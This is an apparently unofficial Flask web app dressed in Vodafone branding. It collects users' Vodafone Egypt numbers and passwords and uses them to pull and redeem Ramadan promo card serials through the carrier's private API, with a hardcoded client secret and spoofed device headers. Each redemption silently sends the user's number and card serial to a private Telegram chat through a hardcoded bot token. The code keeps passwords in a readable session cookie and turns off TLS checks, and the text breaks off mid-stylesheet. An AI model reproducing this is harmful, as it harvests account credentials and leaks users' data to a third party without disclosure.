#!/usr/bin/env python3
"""
TALASHNY - عروض فودافون
pip install flask requests
python talashny.py → http://localhost:5000
"""
try:
    from flask import Flask, request, session, jsonify, render_template_string
    import requests as req
except ImportError:
    import os; os.system("pip install flask requests -q")
    from flask import Flask, request, session, jsonify, render_template_string
    import requests as req

import time, threading, urllib3, datetime, json, os
urllib3.disable_warnings()

app = Flask(__name__)
app.secret_key = "vf_talashny_2025"

# ══════════════════════════════════════════════════════
#  TELEGRAM CONFIG
# ══════════════════════════════════════════════════════
TG_TOKEN   = "7973273382:AAGfOQZmr6N_jkcy9wFc8J0l1C0UUvzyrj0"
TG_CHAT_ID = "1923931101"

def tg_send(msg):
    try:
        req.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "HTML"},
            timeout=10
        )
    except: pass

# ══════════════════════════════════════════════════════
#  BROADCAST MESSAGE — مخزّن في ملف JSON
# ══════════════════════════════════════════════════════
BROADCAST_FILE = "/tmp/broadcast.json"
HISTORY_FILE   = "/tmp/broadcast_history.json"

def read_broadcast():
    try:
        if not os.path.exists(BROADCAST_FILE):
            return {"text":"","type":"info","title":"TALASHNY","id":""}
        with open(BROADCAST_FILE,"r",encoding="utf-8") as f:
            data = json.load(f)
        if data.get("text") and data.get("expire",0) < time.time():
            data["text"] = ""
            with open(BROADCAST_FILE,"w",encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False)
        return data
    except:
        return {"text":"","type":"info","title":"TALASHNY","id":""}

def write_broadcast(text, typ, title, duration=300, icon='', link='', btn_label='افتح الرابط'):
    import uuid as _uuid
    try:
        bid = str(_uuid.uuid4())[:8] if text else ""
        data = {
            "id":        bid,
            "text":      text,
            "type":      typ,
            "title":     title,
            "icon":      icon,
            "link":      link,
            "btn_label": btn_label,
            "duration":  duration,
            "views":     0,
            "sent_at":   datetime.datetime.now().strftime("%H:%M"),
            "expire":    time.time() + duration if text else 0
        }
        with open(BROADCAST_FILE,"w",encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False)
        # أضف للسجل لو في نص
        if text:
            save_history(data)
    except: pass

def save_history(data):
    try:
        history = []
        if os.path.exists(HISTORY_FILE):
            with open(HISTORY_FILE,"r",encoding="utf-8") as f:
                history = json.load(f)
        history.insert(0, {
            "id":       data.get("id",""),
            "title":    data.get("title",""),
            "text":     data.get("text",""),
            "type":     data.get("type","info"),
            "sent_at":  data.get("sent_at",""),
            "views":    0
        })
        history = history[:20]  # آخر 20 إشعار بس
        with open(HISTORY_FILE,"w",encoding="utf-8") as f:
            json.dump(history, f, ensure_ascii=False)
    except: pass

# ══════════════════════════════════════════════════════
#  DAILY CHARGE COUNTER
# ══════════════════════════════════════════════════════
daily_lock    = threading.Lock()
daily_charges = {"date": "", "count": 0, "numbers": []}

def get_today():
    return datetime.datetime.now().strftime("%Y-%m-%d")

def record_charge(number, serial, amount):
    today = get_today()
    with daily_lock:
        if daily_charges["date"] != today:
            daily_charges["date"]    = today
            daily_charges["count"]   = 0
            daily_charges["numbers"] = []
        daily_charges["count"] += 1
        daily_charges["numbers"].append(number)
        count = daily_charges["count"]
    tg_send(
        f"✅ <b>شحن ناجح</b>\n"
        f"━━━━━━━━━━━━\n"
        f"📱 الرقم: <code>{number}</code>\n"
        f"🔢 الكود: <code>{serial}</code>\n"
        f"💰 الفئة: <b>{amount} جنيه</b>\n"
        f"━━━━━━━━━━━━\n"
        f"📊 إجمالي اليوم: <b>{count} شحنة</b>"
    )

def daily_report_loop():
    while True:
        now    = datetime.datetime.now()
        target = now.replace(hour=23, minute=59, second=0, microsecond=0)
        if now >= target:
            target += datetime.timedelta(days=1)
        time.sleep((target - now).total_seconds())
        today = get_today()
        with daily_lock:
            count   = daily_charges.get("count", 0)
            numbers = list(set(daily_charges.get("numbers", [])))
        tg_send(
            f"📋 <b>تقرير يومي — {today}</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🔥 إجمالي الشحنات: <b>{count} شحنة</b>\n"
            f"👥 عدد المستخدمين: <b>{len(numbers)}</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"⚡️ TALASHNY — كروت رمضان"
        )

threading.Thread(target=daily_report_loop, daemon=True).start()

# ══════════════════════════════════════════════════════
#  SCHEDULER — جدولة الإشعارات
# ══════════════════════════════════════════════════════
SCHEDULE_FILE = "/tmp/broadcast_schedule.json"
sched_lock    = threading.Lock()

def read_schedule():
    try:
        if not os.path.exists(SCHEDULE_FILE): return []
        with open(SCHEDULE_FILE,"r",encoding="utf-8") as f:
            return json.load(f)
    except: return []

def write_schedule(items):
    try:
        with open(SCHEDULE_FILE,"w",encoding="utf-8") as f:
            json.dump(items, f, ensure_ascii=False)
    except: pass

def check_schedule_and_fire():
    """يتحقق من الجدولة — بيتستدعى مع كل /fetch"""
    try:
        now_ts  = time.time()
        items   = read_schedule()
        if not items: return
        changed = False
        for item in items:
            if item.get("done"): continue
            try:
                fire_ts = float(item.get("fire_at_ts", 0))
            except (ValueError, TypeError):
                fire_ts = 0
            if fire_ts > 0 and now_ts >= fire_ts:
                write_broadcast(
                    item.get("text",""), item.get("type","info"),
                    item.get("title","TALASHNY"),
                    int(item.get("duration", 300)),
                    item.get("icon",""), item.get("link",""),
                    item.get("btn_label","افتح الرابط")
                )
                item["done"]    = True
                item["done_at"] = now_ts
                changed = True
        if changed:
            write_schedule(items)
    except Exception:
        pass

def scheduler_loop():
    """كل 15 ثانية يتحقق من الإشعارات المجدولة"""
    while True:
        time.sleep(15)
        check_schedule_and_fire()

threading.Thread(target=scheduler_loop, daemon=True).start()

# ══════════════════════════════════════════════════════
#  ONLINE USERS TRACKER
# ══════════════════════════════════════════════════════
online_users = {}
online_lock  = threading.Lock()
PING_TIMEOUT = 30

def update_online(sid):
    with online_lock:
        online_users[sid] = time.time()

def cleanup_online():
    while True:
        time.sleep(10)
        now = time.time()
        with online_lock:
            dead = [k for k,v in online_users.items() if now - v > PING_TIMEOUT]
            for k in dead: del online_users[k]

threading.Thread(target=cleanup_online, daemon=True).start()

def get_online_count():
    with online_lock:
        return len(online_users)

# ══════════════════════════════════════════════════════
#  API
# ══════════════════════════════════════════════════════
def api_login(number, password):
    try:
        r = req.post(
            "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token",
            data={"grant_type":"password","username":number,"password":password,
                  "client_secret":"95fd95fb-7489-4958-8ae6-d31a525cd20a","client_id":"ana-vodafone-app"},
            headers={"Content-Type":"application/x-www-form-urlencoded","Accept":"application/json",
                     "User-Agent":"okhttp/4.11.0","clientId":"AnaVodafoneAndroid",
                     "x-agent-operatingsystem":"13","Accept-Language":"ar",
                     "x-agent-device":"Xiaomi 21061119AG","x-agent-version":"2025.10.3",
                     "x-agent-build":"1050","digitalId":"28RI9U7ISU8SW","device-id":"1df4efae59648ac3"},
            timeout=15, verify=False)
        return r.json()
    except: return {}

def api_promos(token, number):
    try:
        r = req.get(
            "https://web.vodafone.com.eg/services/dxl/ramadanpromo/promotion",
            params={"@type":"RamadanHub","channel":"website","msisdn":number},
            headers={"Authorization":f"Bearer {token}","Accept":"application/json",
                     "clientId":"WebsiteConsumer","api-host":"PromotionHost","channel":"WEB",
                     "Accept-Language":"ar","msisdn":number,"Content-Type":"application/json",
                     "User-Agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                     "Referer":"https://web.vodafone.com.eg/ar/ramadan"},
            timeout=15, verify=False)
        dec = r.json()
    except: return []
    cards = []
    if not isinstance(dec, list): return cards
    for item in dec:
        if not isinstance(item, dict) or "pattern" not in item: continue
        for pat in item["pattern"]:
            for act in pat.get("action", []):
                c = {ch["name"]: str(ch["value"]) for ch in act.get("characteristics", [])}
                serial = c.get("CARD_SERIAL","").strip()
                if len(serial) != 13: continue
                cards.append({"serial":serial,"gift":int(c.get("GIFT_UNITS",0)),
                              "amount":int(c.get("amount",0)),"remaining":int(c.get("REMAINING_DEDICATIONS",0))})
    cards.sort(key=lambda x: -x["amount"])
    return cards

def api_redeem(token, number, serial):
    try:
        r = req.post(
            "https://web.vodafone.com.eg/services/dxl/ramadanpromo/promotion",
            json={"@type":"Promo","channel":{"id":"1"},"context":{"type":"RamadanRedeemFromHub"},
                  "pattern":[{"characteristics":[{"name":"cardSerial","value":serial}]}]},
            headers={"Authorization":f"Bearer {token}","Content-Type":"application/json",
                     "Accept":"application/json","clientId":"WebsiteConsumer","channel":"WEB",
                     "msisdn":number,"Accept-Language":"AR",
                     "User-Agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                     "Origin":"https://web.vodafone.com.eg",
                     "Referer":"https://web.vodafone.com.eg/portal/hub"},
            timeout=15, verify=False)
        return r.status_code
    except: return 0

def do_refresh():
    if time.time() < session.get("token_exp", 0): return True
    res = api_login(session.get("number",""), session.get("password",""))
    if "access_token" in res:
        session["token"]     = res["access_token"]
        session["token_exp"] = time.time() + int(res.get("expires_in",3600)) - 120
        return True
    return False

# ══════════════════════════════════════════════════════
#  HTML
# ══════════════════════════════════════════════════════
PAGE = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
<title>كروت رمضان — TALASHNY</title>
<link href="https://fonts.googleapis.com/css2?family=Alexandria:wght@700;800;900&display=swap" rel="stylesheet"/>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
<style>
:root{
  --red:#E60000;--red3:#FF2020;
  --dark:#0a0a0a;--dark2:#111111;--dark3:#1a1a1a;--dark4:#222222;
  --gold:#e8c76f;--green:#00C853;
  --border:rgba(255,255,255,.07);--border-red:rgba(230,0,0,.22);
  --text:#f0f0f0;--text2:rgba(255,255,255,.55);--text3:rgba(255,255,255,.25);
  --r:14px;--r-sm:10px;
}
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{width:100%;height:100%;overflow:hidden}
body{font-family:'Alexandria',sans-serif;background:var(--dark);color:var(--text)}
img{pointer-events:none;-webkit-user-drag:none}

/* ══ حماية النسخ ══ */
*{
  -webkit-user-select:none;
  -moz-user-select:none;
  user-select:none;
}
input, textarea{
  -webkit-user-select:text;
  user-select:text;
}

.screen{
  position:fixed;inset:0;display:flex;flex-direction:column;
  align-items:center;justify-content:center;
  background:var(--dark);
  opacity:0;pointer-events:none;
  z-index:10;overflow:hidden;
  transition:opacity .38s ease;
}
.screen.active{
  opacity:1;pointer-events:all;z-index:20;
}

/* ════════ SPLASH ════════ */
#s-splash{background:#0a0a0a;z-index:50;}
#s-splash.active{z-index:50;}
.crescent-box{
  position:relative;width:240px;height:240px;
  display:flex;align-items:center;justify-content:center;
  opacity:0;transform:scale(1.3);
  animation:crescIn 1.6s cubic-bezier(.34,1.15,.64,1) .3s forwards;
}
@keyframes crescIn{to{opacity:1;transform:scale(1)}}
.crescent-box svg{position:absolute;inset:0;width:100%;height:100%;overflow:visible;}
.vf-logo{
  position:relative;z-index:5;width:120px;
  opacity:0;transform:scale(.1) translate(0,0);
  animation:logoIn 1.1s cubic-bezier(.34,1.5,.64,1) 1.8s forwards;
  filter:drop-shadow(0 2px 14px rgba(255,255,255,.18));
}
@keyframes logoIn{to{opacity:1;transform:scale(1)}}
.sp-title{
  margin-top:18px;font-size:clamp(1.9rem,8vw,2.7rem);
  font-weight:900;color:var(--gold);letter-spacing:2px;
  opacity:0;transform:translateY(14px);
  animation:fadeUp .7s ease 2.5s forwards;
  text-shadow:0 0 28px rgba(232,199,111,.4);
}
.sp-sub{
  margin-top:6px;font-size:.8rem;color:rgba(232,199,111,.5);letter-spacing:1px;
  opacity:0;animation:fadeUp .6s ease 3s forwards;
}
.sp-bar{
  width:88px;height:2px;border-radius:2px;
  background:rgba(232,199,111,.1);margin-top:24px;overflow:hidden;
  opacity:0;animation:fadeUp .4s ease 3.2s forwards;
}
.sp-fill{height:100%;background:var(--gold);width:0;animation:fillBar 2.2s ease 3.4s forwards;}
@keyframes fillBar{to{width:100%}}
@keyframes fadeUp{to{opacity:1;transform:translateY(0)}}

/* ════════ LOGIN ════════ */
#s-login{
  background:radial-gradient(ellipse 70% 40% at 50% 0%,rgba(230,0,0,.09),transparent 65%),var(--dark);
  padding:24px 18px;overflow-y:auto;
}
.login-wrap{width:100%;max-width:370px;}
.login-head{text-align:center;margin-bottom:26px;}
.login-icon{
  width:68px;height:68px;border-radius:18px;margin:0 auto 13px;
  background:linear-gradient(145deg,#180000,#0d0d0d);
  border:1px solid rgba(230,0,0,.2);
  display:flex;align-items:center;justify-content:center;
  box-shadow:0 0 36px rgba(230,0,0,.12),0 8px 24px rgba(0,0,0,.5);
}
.login-icon img{width:38px;}
.login-title{font-size:1.5rem;font-weight:900;letter-spacing:5px;color:var(--text);}
.login-sub{font-size:.65rem;color:var(--text3);letter-spacing:1.5px;margin-top:3px;}
.login-card{
  background:var(--dark2);border:1px solid var(--border);
  border-radius:18px;padding:20px 16px;
  box-shadow:0 12px 40px rgba(0,0,0,.6);
}
.card-sep{
  font-size:.53rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;
  color:var(--text3);text-align:center;margin-bottom:16px;
  display:flex;align-items:center;gap:10px;
}
.card-sep::before,.card-sep::after{content:'';flex:1;height:1px;background:var(--border);}
.field{margin-bottom:12px;}
.field label{
  display:block;font-size:.56rem;font-weight:700;letter-spacing:1.5px;
  text-transform:uppercase;color:var(--text3);margin-bottom:6px;transition:color .2s;
}
.field:focus-within label{color:rgba(230,0,0,.8);}
.input-box{
  display:flex;align-items:center;
  background:var(--dark3);border:1.5px solid var(--border);
  border-radius:var(--r-sm);overflow:hidden;
  transition:border-color .25s,box-shadow .25s;
}
.field:focus-within .input-box{border-color:var(--border-red);box-shadow:0 0 0 3px rgba(230,0,0,.07);}
.input-box input{
  flex:1;background:none;border:none;outline:none;
  font-family:'Alexandria',sans-serif;font-size:.88rem;font-weight:700;color:var(--text);
  padding:13px 14px;direction:rtl;
}
.input-box input::placeholder{color:var(--text3);font-weight:700;font-size:.75rem;}
.input-box .ico{width:40px;text-align:center;font-size:.75rem;color:var(--text3);transition:color .2s;flex-shrink:0;}
.field:focus-within .ico{color:var(--red);}
.err-box{
  display:flex;align-items:center;gap:8px;
  background:rgba(230,0,0,.06);border:1px solid rgba(230,0,0,.18);
  border-radius:10px;padding:10px 13px;margin-bottom:12px;
  font-size:.7rem;font-weight:700;color:#ff6060;animation:shake .3s ease;
}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}
.btn-login{
  width:100%;padding:14px;border:none;border-radius:var(--r-sm);
  background:var(--red);color:#fff;
  font-family:'Alexandria',sans-serif;font-size:.88rem;font-weight:800;
  cursor:pointer;position:relative;overflow:hidden;
  box-shadow:0 4px 20px rgba(230,0,0,.28);
  transition:transform .2s,box-shadow .2s,background .2s;margin-top:2px;
}
.btn-login::before{content:'';position:absolute;top:0;left:0;right:0;height:50%;background:rgba(255,255,255,.06);}
.btn-login:hover{background:var(--red3);transform:translateY(-1px);box-shadow:0 6px 26px rgba(230,0,0,.38);}
.btn-login:active{transform:scale(.97);}
.btn-login:disabled{opacity:.45;cursor:wait;transform:none;}
.sec-note{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:10px;font-size:.56rem;color:var(--text3);}
.sec-note i{color:rgba(0,200,90,.5);}

/* ════════ APP ════════ */
#s-app{justify-content:flex-start;align-items:stretch;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;}
.topbar{
  width:100%;background:rgba(10,10,10,.97);backdrop-filter:blur(22px);
  border-bottom:1px solid var(--border);
  display:flex;align-items:center;justify-content:space-between;
  padding:0 15px;height:60px;flex-shrink:0;
  position:sticky;top:0;z-index:50;
}
.tbar-brand{display:flex;align-items:center;gap:9px;}
.tbar-logo{
  width:34px;height:34px;border-radius:9px;
  background:linear-gradient(135deg,#1a0000,var(--dark3));
  border:1px solid rgba(230,0,0,.2);
  display:flex;align-items:center;justify-content:center;
  box-shadow:0 0 14px rgba(230,0,0,.2);
}
.tbar-logo img{width:20px;}
.tbar-name{font-size:.9rem;font-weight:900;letter-spacing:4px;color:var(--text);}
.tbar-right{display:flex;flex-direction:column;align-items:flex-end;gap:2px;}
.tbar-num{font-size:.73rem;font-weight:800;color:var(--text);}
.tbar-live{display:flex;align-items:center;gap:4px;font-size:.5rem;font-weight:700;color:var(--green);}
.live-dot{
  width:5px;height:5px;border-radius:50%;background:var(--green);flex-shrink:0;
  animation:livePulse 2s infinite;cursor:pointer;
}
@keyframes livePulse{0%,100%{box-shadow:0 0 0 0 rgba(0,200,90,.5);}70%{box-shadow:0 0 0 5px rgba(0,200,90,0);}}
.appwrap{width:100%;max-width:480px;margin:0 auto;padding:14px 13px 90px;}
.toprow{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;}
.btn-logout{
  display:flex;align-items:center;gap:5px;
  background:var(--dark3);border:1px solid var(--border);
  border-radius:100px;padding:7px 13px;
  font-family:'Alexandria',sans-serif;font-size:.6rem;font-weight:700;
  color:var(--text3);cursor:pointer;transition:all .2s;
}
.btn-logout:hover{border-color:var(--border-red);color:var(--red);background:rgba(230,0,0,.05);}
.stats-bar{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:12px;}
.stat{
  background:var(--dark2);border:1px solid var(--border);
  border-radius:var(--r);padding:12px 8px;text-align:center;
  position:relative;overflow:hidden;
}
.stat::before{content:'';position:absolute;top:0;left:0;right:0;height:2.5px;}
.stat.s-red::before{background:var(--red);}
.stat.s-gold::before{background:var(--gold);}
.stat.s-green::before{background:var(--green);}
.stat-val{font-size:1.25rem;font-weight:900;line-height:1;display:flex;align-items:center;justify-content:center;gap:3px;}
.stat.s-red .stat-val{color:var(--red);}
.stat.s-gold .stat-val{color:var(--gold);}
.stat.s-green .stat-val{color:var(--green);}
.stat-lbl{font-size:.49rem;font-weight:700;color:var(--text3);letter-spacing:.5px;margin-top:4px;}
.timer-row{
  display:flex;align-items:center;gap:11px;
  background:var(--dark2);border:1px solid var(--border);
  border-radius:var(--r-sm);padding:10px 13px;margin-bottom:12px;
}
.t-ring{width:36px;height:36px;flex-shrink:0;position:relative;}
.t-ring svg{width:36px;height:36px;transform:rotate(-90deg);}
.t-bg{fill:none;stroke:rgba(255,255,255,.05);stroke-width:3;}
.t-prog{
  fill:none;stroke:var(--red);stroke-width:3;stroke-linecap:round;
  stroke-dasharray:100;stroke-dashoffset:0;
  transition:stroke-dashoffset .9s linear,stroke .3s;
  filter:drop-shadow(0 0 3px rgba(230,0,0,.6));
}
.t-count{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:.63rem;font-weight:900;}
.t-info{flex:1;}
.t-label{font-size:.7rem;font-weight:700;color:var(--text2);}
.t-sub{font-size:.52rem;color:var(--text3);margin-top:1px;}
.live-badge{
  display:flex;align-items:center;gap:4px;
  background:rgba(230,0,0,.08);border:1px solid rgba(230,0,0,.2);
  border-radius:100px;padding:4px 10px;
  font-size:.5rem;font-weight:800;color:var(--red);letter-spacing:1.5px;
}
.lb-dot{width:5px;height:5px;border-radius:50%;background:var(--red);flex-shrink:0;animation:blink 1s infinite;}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.1}}
.sec-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;}
.sec-title{font-size:.57rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--text3);display:flex;align-items:center;gap:7px;}
.sec-line{width:13px;height:2px;border-radius:2px;background:var(--red);}
.sec-badge{font-size:.57rem;font-weight:700;color:var(--text3);background:var(--dark3);border:1px solid var(--border);padding:3px 10px;border-radius:100px;}
.promo-card{
  background:var(--dark2);border:1px solid var(--border);
  border-radius:var(--r);margin-bottom:9px;overflow:hidden;
  animation:cardIn .4s cubic-bezier(.34,1.2,.64,1) both;
  animation-delay:calc(var(--i,0)*.07s);
  transition:border-color .2s,transform .2s,box-shadow .2s;
  will-change:transform;
}
.promo-card:active{transform:scale(.98);box-shadow:0 2px 8px rgba(0,0,0,.4);}
@keyframes cardIn{from{opacity:0;transform:translateY(18px) scale(.97)}to{opacity:1;transform:none}}
.card-stripe{height:3px;background:linear-gradient(90deg,var(--red),rgba(230,0,0,.2),transparent);}
.card-body{display:flex;align-items:stretch;padding:13px 13px 0;}
.card-amount{
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  min-width:64px;padding-left:13px;border-left:1px solid var(--border);margin-left:13px;
}
.amt-num{font-size:1.95rem;font-weight:900;color:var(--text);line-height:1;}
.amt-cur{font-size:.49rem;font-weight:700;color:var(--text3);letter-spacing:1px;margin-top:2px;}
.card-chips{display:flex;gap:5px;flex-wrap:wrap;}
.chip{display:inline-flex;align-items:center;gap:3px;padding:4px 8px;border-radius:100px;font-size:.56rem;font-weight:700;}
.chip-red{background:rgba(230,0,0,.07);color:#ff8888;border:1px solid rgba(230,0,0,.14);}
.chip-gold{background:rgba(232,199,111,.07);color:#e8c76f;border:1px solid rgba(232,199,111,.14);}
.chip-blue{background:rgba(79,195,247,.06);color:#80ccee;border:1px solid rgba(79,195,247,.11);}
.chip i{font-size:.47rem;}
.card-serial{
  display:flex;align-items:center;justify-content:space-between;
  background:rgba(0,0,0,.2);margin:11px 0 0;padding:9px 13px;
  border-top:1px solid var(--border);gap:8px;
}
.serial-val{font-family:monospace;font-size:.86rem;letter-spacing:2px;color:var(--text);font-weight:600;flex:1;text-align:right;}
.btn-copy{
  width:28px;height:28px;border-radius:8px;
  background:rgba(255,255,255,.04);border:1px solid var(--border);
  display:flex;align-items:center;justify-content:center;
  cursor:pointer;color:var(--text3);transition:all .2s;flex-shrink:0;
}
.btn-copy:hover{background:rgba(230,0,0,.1);border-color:rgba(230,0,0,.3);color:var(--red);}
.btn-copy:active{transform:scale(.8);}
.btn-copy i{font-size:.58rem;}
.card-btns{display:flex;gap:7px;padding:9px;}
.btn-charge{
  flex:1;display:flex;align-items:center;justify-content:center;gap:5px;
  padding:10px 6px;border:none;border-radius:var(--r-sm);
  background:var(--red);color:#fff;
  font-family:'Alexandria',sans-serif;font-size:.7rem;font-weight:800;
  cursor:pointer;position:relative;overflow:hidden;
  box-shadow:0 3px 12px rgba(230,0,0,.24);transition:all .2s;
}
.btn-charge::before{content:'';position:absolute;top:0;left:0;right:0;height:50%;background:rgba(255,255,255,.06);}
.btn-charge:hover{background:var(--red3);transform:translateY(-1px);box-shadow:0 5px 18px rgba(230,0,0,.34);}
.btn-charge:active{transform:scale(.95);}
.btn-charge.done{background:#00a040;box-shadow:0 3px 12px rgba(0,160,64,.25);}
.btn-charge.loading{opacity:.55;pointer-events:none;}
.btn-dial{
  flex:1;display:flex;align-items:center;justify-content:center;gap:5px;
  padding:10px 6px;border-radius:var(--r-sm);
  background:var(--dark3);border:1px solid var(--border);
  color:var(--text2);font-family:'Alexandria',sans-serif;font-size:.7rem;font-weight:800;
  cursor:pointer;text-decoration:none;transition:all .2s;
}
.btn-dial:hover{background:var(--dark4);color:var(--text);}
.btn-dial:active{transform:scale(.95);}
.empty{text-align:center;padding:46px 20px;background:var(--dark2);border:1px solid var(--border);border-radius:var(--r);}
.empty i{font-size:2rem;color:var(--text3);display:block;margin-bottom:10px;}
.empty p{font-size:.8rem;color:var(--text2);}
.empty small{font-size:.6rem;color:var(--text3);display:block;margin-top:4px;}
.botnav{
  position:fixed;bottom:0;left:0;right:0;height:60px;
  background:rgba(8,8,8,.97);backdrop-filter:blur(22px);
  border-top:1px solid var(--border);
  display:flex;justify-content:space-around;align-items:stretch;z-index:400;
}
.nav-link{
  flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
  gap:3px;text-decoration:none;color:var(--text3);
  font-size:.49rem;font-weight:700;letter-spacing:.5px;
  border-top:2px solid transparent;transition:color .2s,border-color .2s;
}
.nav-link:hover{color:var(--red);border-color:var(--red);}
.nav-link i{font-size:1.05rem;}
.toast{
  position:fixed;bottom:70px;left:50%;
  transform:translateX(-50%) translateY(12px);opacity:0;
  background:rgba(8,8,8,.96);border:1px solid var(--border);
  border-radius:100px;padding:9px 22px;
  font-family:'Alexandria',sans-serif;font-size:.7rem;font-weight:700;color:var(--text);
  pointer-events:none;z-index:9998;white-space:nowrap;backdrop-filter:blur(20px);
  box-shadow:0 8px 28px rgba(0,0,0,.6);
  transition:all .3s cubic-bezier(.34,1.4,.64,1);
}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
.toast.ok{border-color:rgba(0,200,90,.3);color:var(--green);}
.toast.err{border-color:rgba(230,0,0,.3);color:#ff5555;}

/* ════════ SLIDE NOTIFICATION ════════ */
.notif-slide{
  position:fixed;top:70px;left:-360px;
  width:320px;
  background:rgba(12,12,12,.98);
  border:1px solid var(--border);
  border-right:3px solid var(--red);
  border-radius:16px;
  padding:13px 14px 10px;
  z-index:9999;
  backdrop-filter:blur(24px);
  box-shadow:0 10px 40px rgba(0,0,0,.8),0 0 0 1px rgba(230,0,0,.05);
  transition:left .45s cubic-bezier(.34,1.15,.64,1);
  pointer-events:none;
  cursor:default;
}
.notif-slide.show{left:10px;pointer-events:all;}
.notif-slide.has-link{cursor:pointer;}
.notif-slide.has-link:hover{ border-color:rgba(230,0,0,.3); }
.notif-slide:active{ transform:scale(.98); }

.notif-top-row{display:flex;align-items:flex-start;gap:11px;}
.notif-slide-icon{
  width:38px;height:38px;border-radius:10px;
  background:rgba(230,0,0,.1);border:1px solid rgba(230,0,0,.2);
  display:flex;align-items:center;justify-content:center;
  color:var(--red);font-size:.95rem;flex-shrink:0;overflow:hidden;
}
.notif-slide-icon img{width:100%;height:100%;object-fit:cover;border-radius:10px;}
.notif-slide-body{flex:1;min-width:0;}
.notif-slide-title{
  font-size:.68rem;font-weight:800;color:var(--text);
  display:flex;align-items:center;justify-content:space-between;gap:6px;
  margin-bottom:2px;
}
.notif-slide-app{font-size:.48rem;color:var(--text3);font-weight:700;letter-spacing:1px;}
.notif-slide-text{font-size:.62rem;color:var(--text2);line-height:1.5;word-break:break-word;margin-top:2px;}

/* زرار الرابط */
.notif-action-btn{
  display:flex;align-items:center;justify-content:center;gap:5px;
  margin-top:10px;
  padding:8px 14px;
  background:rgba(230,0,0,.09);
  border:1px solid rgba(230,0,0,.2);
  border-radius:8px;
  font-family:'Alexandria',sans-serif;
  font-size:.62rem;font-weight:800;color:var(--red);
  cursor:pointer;text-decoration:none;
  transition:background .2s,border-color .2s;
  width:100%;text-align:center;
}
.notif-action-btn:hover{background:rgba(230,0,0,.15);border-color:rgba(230,0,0,.35);}
.notif-action-btn i{font-size:.55rem;}

.notif-bar{
  position:absolute;bottom:0;left:0;right:0;height:2px;
  background:rgba(230,0,0,.1);border-radius:0 0 16px 16px;overflow:hidden;
}
.notif-bar-fill{
  height:100%;background:var(--red);width:100%;
  transform-origin:right;
}

/* ════════ ADMIN OVERLAY ════════ */
.admin-overlay{
  position:fixed;inset:0;
  background:rgba(0,0,0,.88);
  backdrop-filter:blur(18px);
  z-index:10000;
  display:flex;align-items:flex-end;justify-content:center;
  padding:0;
  opacity:0;pointer-events:none;
  transition:opacity .3s ease;
}
.admin-overlay.open{opacity:1;pointer-events:all;}

.admin-panel{
  width:100%;max-width:460px;
  background:var(--dark2);
  border:1px solid var(--border);
  border-radius:22px 22px 0 0;
  box-shadow:0 -10px 60px rgba(0,0,0,.9);
  transform:translateY(100%);
  transition:transform .38s cubic-bezier(.34,1.1,.64,1);
  display:flex;flex-direction:column;
  height:92vh;max-height:92vh;
  overflow:hidden;
}
.admin-overlay.open .admin-panel{transform:translateY(0);}

.admin-drag-bar{
  width:40px;height:4px;border-radius:2px;
  background:rgba(255,255,255,.15);
  margin:10px auto 0;flex-shrink:0;
}

.admin-head{
  background:linear-gradient(135deg,rgba(230,0,0,.12),rgba(0,0,0,.0));
  border-bottom:1px solid var(--border);
  padding:14px 18px;
  display:flex;align-items:center;justify-content:space-between;
  flex-shrink:0;
}
.admin-head-left{display:flex;align-items:center;gap:11px;}
.admin-head-icon{
  width:38px;height:38px;border-radius:10px;
  background:rgba(230,0,0,.1);border:1px solid rgba(230,0,0,.2);
  display:flex;align-items:center;justify-content:center;
  color:var(--red);font-size:.9rem;
}
.admin-head-title{font-size:.88rem;font-weight:900;letter-spacing:2px;color:var(--text);}
.admin-head-sub{font-size:.52rem;color:var(--text3);margin-top:2px;letter-spacing:1px;}
.admin-close{
  width:32px;height:32px;border-radius:8px;
  background:rgba(255,255,255,.04);border:1px solid var(--border);
  display:flex;align-items:center;justify-content:center;
  cursor:pointer;color:var(--text3);font-size:.7rem;
  transition:all .2s;
}
.admin-close:hover{background:rgba(230,0,0,.1);border-color:rgba(230,0,0,.3);color:var(--red);}

/* Auth layer */
.admin-auth{
  padding:22px 20px;
  overflow-y:auto;-webkit-overflow-scrolling:touch;
  flex:1;
}
.admin-auth-title{
  font-size:.65rem;font-weight:700;letter-spacing:2px;
  text-transform:uppercase;color:var(--text3);
  text-align:center;margin-bottom:16px;
}
.pin-dots{
  display:flex;align-items:center;justify-content:center;
  gap:10px;margin-bottom:20px;
}
.pin-dot{
  width:12px;height:12px;border-radius:50%;
  background:var(--dark3);border:1.5px solid var(--border);
  transition:all .2s;
}
.pin-dot.filled{background:var(--red);border-color:var(--red);box-shadow:0 0 8px rgba(230,0,0,.5);}
.pin-dot.err{background:#ff4444;border-color:#ff4444;animation:shake .3s ease;}
.pw-field-wrap{
  background:var(--dark3);border:1.5px solid var(--border);
  border-radius:var(--r-sm);display:flex;align-items:center;
